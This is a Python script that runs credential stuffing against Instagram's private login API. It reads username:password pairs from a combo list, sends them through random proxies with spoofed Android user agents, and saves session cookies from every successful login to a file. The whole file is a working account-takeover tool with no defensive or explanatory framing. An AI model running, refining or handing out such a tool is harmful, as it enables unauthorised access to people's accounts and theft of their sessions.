import json
import random
import uuid
import httpx
import asyncio


class Main:
    def __init__(self) -> None:
        self.proxies = open("proxies.txt", "r").read().splitlines()

    @staticmethod
    def __base_headers() -> (json and dict):
        return {
            "Host"   : "i.instagram.com",
            "User-Agent": Main.__base_useragent(),
            "cookie": "missing",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

    @staticmethod
    def __base_useragent():

        __user_agent = "Instagram {} Android (30/3.0; {}dpi; {}; huawei/google; {}; angler; angler; en_US)".format(
            random.choice(["114.0.0.20.2","114.0.0.38.120","114.0.0.20.70","114.0.0.28.120","114.0.0.0.24","114.0.0.0.41"]),
            random.choice(["133","320","515","160","640","240","120","800","480","225","768","216","1024",]),
            random.choice(["623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688",]),
            random.choice(["Nokia 2.4","HUAWEI","Galaxy","Unlocked Smartphones","Nexus 6P","Mobile Phones","Xiaomi","samsung","OnePlus",]),
        )

        return __user_agent

    async def __login_req(
        self, client: httpx.AsyncClient, username: str, password: str
    ) -> str:
        try:
            __login_payload = {
                "uuid": str(uuid.uuid4()),
                "password": password,
                "username": username,
                "device_id": uuid.uuid4(),
                "from_reg": "false",
                "_csrftoken": "missing",
                "login_attempt_countn": "0",
            }

            resp: httpx.Response = await client.post(
                url = "https://i.instagram.com/api/v1/accounts/login/",
                headers = Main.__base_headers(),
                data = __login_payload,
                follow_redirects=True
            )
            if "logged_in_user" in resp.text:
                with open("cookies.txt", "a") as x:
                    x.write(str(resp.cookies) + "\n")
                
        except:
            await self.__login_req(client, username, password)

    async def start(self) -> None:
        proxy = random.choice(self.proxies)
        __http_proxy= {
            "http://": f"http://{proxy}",
            "https://": f"http://{proxy}"
        }

        async with httpx.AsyncClient(proxies = __http_proxy, timeout=5) as client:
            __async_tasks = []
            for combo in open("combolist.txt", "r").read().splitlines():
                username, password = combo.split(":")

                __async_tasks.append(
                    asyncio.ensure_future(
                        self.__login_req(
                            client=client, password=password, username=username
                        )
                    )
                )
                
                await asyncio.gather(*__async_tasks)

if __name__ == "__main__":
    asyncio.run(Main().start())

